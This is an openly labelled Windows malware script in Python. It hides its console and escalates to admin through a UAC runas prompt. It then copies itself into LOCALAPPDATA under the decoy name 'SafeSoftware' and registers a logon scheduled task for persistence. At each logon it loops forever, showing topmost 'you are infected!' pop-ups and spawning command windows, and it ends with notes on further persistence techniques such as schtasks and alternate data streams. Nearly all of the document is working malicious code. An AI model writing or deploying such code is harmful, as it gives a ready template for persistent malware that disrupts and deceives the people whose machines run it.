import sys
import os
import random
import shutil
import ctypes
from shutil import copy
from termcolor import colored
from pathlib import Path
from itertools import cycle


def script_path():
    """set current path, to script path"""
    current_path = os.path.realpath(os.path.dirname(sys.argv[0]))
    os.chdir(current_path)
    return current_path
    
    
def hello_popup(lower_text):
    """
    message window topmost:
        https://stackoverflow.com/questions/50086178/python-how-to-keep-messageboxw-on-top-of-all-other-windows
    """
    text = '________________you are infected!________________\n{}'.format(lower_text)
    # ctypes.windll.user32.MessageBoxW(0, text, "%root\\System32%malware", 2)
    ctypes.windll.user32.MessageBoxW(0, text, "%root\\System32%malware", 0x1002)
    return None
    
    
def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    return None
    
    
def check_if_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()
    
    
def malicious_code():
    """
    todo:
        -set windows positions in some tricky manner
        
    """
    counter = 0
    sentence = 'You should have bought a squirrel!'
    sequence = cycle(sentence.split())
    commands = [
        'color a && tree C:\\',
        'color a && tree C:\\',
        'color a && tree C:\\',
        'color a && netstat',
        'color a && ping 8.8.8.8 -n 999',
    ]
    
    lower_text = ''
    while True:
        print('[*] counter: {}'.format(counter))
        if (counter > 1):
            lower_text = next(sequence)
        hello_popup(lower_text)
        
        if (counter > 1) and not (counter % 3):
            command = random.choice(commands)
            # os.system('start cmd /K "color a && tree C:\\"')
            os.system('start cmd /K "{}"'.format(command))
        counter += 1
    return None
    
    
if __name__ == "__main__":
    # ********* setup *********
    hide_console()      # hide your actions
    script_path()
    os.system('color')
    args = sys.argv[1:]
    script_name = Path(sys.argv[0]).name
    print(colored('[*] script name: {}'.format(script_name), 'cyan'))
    
    
    # ********* persistence *********
    if not 'run' in args:
        if not check_if_admin():
            print(colored('[x] no admin rights', 'yellow'))
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
            
        company_name = 'SafeSoftware'     
        executable_file = script_name   # copy yourself
        local_app_data = os.environ['LOCALAPPDATA']
        destination_path = Path(local_app_data).joinpath(company_name)
        destination_path.mkdir(parents=True, exist_ok=True)
        destination_path = destination_path.joinpath(executable_file)
        
        
        # ********* copy file & add task *********
        print(colored('[*] executable_file: {}'.format(executable_file), 'cyan'))
        print(colored('[*] destination_path: {}'.format(destination_path), 'cyan'))
        copy_command = copy(executable_file, destination_path)
        print(colored('[*] copy executed: {} -> {}'.format(executable_file, destination_path), 'cyan'))
        
        
        # task_command = 'schtasks /create /sc minute /mo 5 /tn Softonic /tr "PATH_TO_PYTHON_EXE PATH_TO_PYTHON_SCRIPT"'
        task_command = 'schtasks /CREATE /SC ONLOGON /TN {} /F /TR "{} run"'.format(company_name, destination_path)
        print(colored('[*] task: {}'.format(task_command), 'red'))
        os.system(task_command)
        sys.exit()
        
        
    # ********* run malicious code each time *********
    print(colored('[*] malicious code is running', 'red'))
    malicious_code()
    
    
"""
tasks hives:
    https://stackoverflow.com/questions/20454115/where-does-windows-store-the-settings-for-scheduled-tasks-console
    Filesystem:
        %systemroot%\System32\Tasks
        %systemroot%\Tasks
        
    Registry:
        HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tasks
        HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\Taskcache\Tree
        
Schtasks.exe can be use for creating tasks
    schtasks /Create /SC HOURLY /TN PythonTask /TR "PATH_TO_PYTHON_EXE PATH_TO_PYTHON_SCRIPT"
    schtasks /Create /SC HOURLY /TN Softonic /TR "PATH_TO_PYTHON_EXE PATH_TO_PYTHON_SCRIPT"
    
alternate data streams:
    https://github.com/RobinDavid/pyADS
    
"""

